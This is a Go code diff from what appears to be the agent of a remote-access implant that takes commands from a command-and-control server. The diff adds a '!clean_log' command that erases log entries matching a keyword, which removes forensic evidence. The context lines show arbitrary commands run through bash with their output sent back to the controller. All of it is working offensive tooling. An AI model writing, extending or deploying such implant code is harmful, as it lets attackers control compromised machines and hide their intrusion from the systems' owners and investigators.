@@ -166,6 +166,21 @@ func processCCData(data *MsgTunData) {
 			goto send
 		}
 
+		// log cleaner
+		if cmdSlice[0] == "!clean_log" {
+			if len(cmdSlice) != 2 {
+				return
+			}
+			keyword := cmdSlice[1]
+			out = "Done"
+			err = CleanAllByKeyword(keyword)
+			if err != nil {
+				out = err.Error()
+			}
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
+		}
+
 		// exec cmd using os/exec normally, sends stdout and stderr back to CC
 		cmd := exec.Command("bash", "-c", strings.Join(cmdSlice, " "))
 		outCombined, err = cmd.CombinedOutput()
